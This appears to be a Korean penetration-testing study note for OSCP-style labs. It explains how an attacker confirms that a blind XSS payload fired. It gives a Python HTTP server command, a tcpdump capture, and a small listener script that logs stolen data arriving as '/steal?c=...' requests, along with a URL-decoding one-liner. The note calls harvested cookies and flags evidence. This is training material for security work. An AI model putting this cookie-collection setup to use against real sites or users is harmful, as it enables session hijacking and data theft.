# XSS 수신 확인 (공격자 측)

## 개요

XSS 페이로드가 실행되면 공격자 서버로 요청이 도달한다. 서버를 띄워 요청 도달 여부를 확인한다. OSCP 웹 공격 단계에서 블라인드 XSS 판단 기준으로도 사용한다.

## 기본 HTTP 서버

```bash
python3 -m http.server 8000
```

- 서버 로그에 `GET /steal?c=...` 요청이 뜨면 성공이다.
- 요청이 도달했는지가 공격 성공의 기준이다(화면에 결과가 안 보여도 성공).

## tcpdump로 트래픽 관찰

```bash
sudo tcpdump -i tun0 port 8000
```

## 요청 경로와 본문을 출력하는 수신 스크립트

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("GET", self.path)
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n).decode()
        print("POST", self.path, body)
        self.send_response(200)
        self.end_headers()

HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
```

## 수신한 값 디코딩

```bash
python3 -c "import urllib.parse; print(urllib.parse.unquote('여기에_값'))"
```

## 확인 사항

- 서버는 공격자 PC에서 띄우고, 대상이 접근 가능한 IP/포트를 사용한다.
- 방화벽·VPN(tun0) 인터페이스를 확인해 요청이 실제로 도달하는지 본다.
- 도달 경로를 통해 어떤 파라미터가 악용되었는지 추적한다.
- 얻은 데이터(쿠키·플래그)는 증적에 포함한다.